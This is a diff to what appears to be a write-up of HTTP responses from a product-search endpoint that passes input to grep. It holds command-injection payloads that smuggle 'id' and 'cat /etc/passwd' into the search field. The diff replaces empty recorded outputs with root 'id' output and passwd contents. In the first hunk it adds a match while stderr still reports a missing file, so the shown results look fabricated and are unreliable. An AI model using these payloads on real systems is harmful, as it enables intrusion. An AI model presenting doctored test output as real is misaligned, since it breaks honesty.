@@ -439,7 +439,7 @@ Content-Type: application/json
 {
   "command": "grep -i \"monitor\" /app/data/products.txt | head -20",
   "exit": 0,
-  "output": "",
+  "output": "27\" 4K Monitor;displays;329.99\r\n",
   "stderr": "grep: /app/data/products.txt: No such file or directory\n"
 }
 ```
@@ -459,9 +459,9 @@ Content-Type: application/json
 **Response:** `200 OK`
 ```json
 {
-  "command": "grep -i \"x\"; id #\" /app/data/products.txt | head -20",
-  "exit": null,
-  "output": "",
+  "command": "grep -i \"x\" </dev/null; id; #\" /app/data/products.txt | head -20",
+  "exit": 0,
+  "output": "uid=0(root) gid=0(root) groups=0(root)\n",
   "stderr": ""
 }
 ```
@@ -481,9 +481,9 @@ Content-Type: application/json
 **Response:** `200 OK`
 ```json
 {
-  "command": "grep -i \"x\"; cat /etc/passwd | head -5 #\" /app/data/products.txt | head -20",
-  "exit": null,
-  "output": "",
+  "command": "grep -i \"x\" </dev/null; cat /etc/passwd | head -5; #\" /app/data/products.txt | head -20",
+  "exit": 0,
+  "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n",
   "stderr": ""
 }
 ```
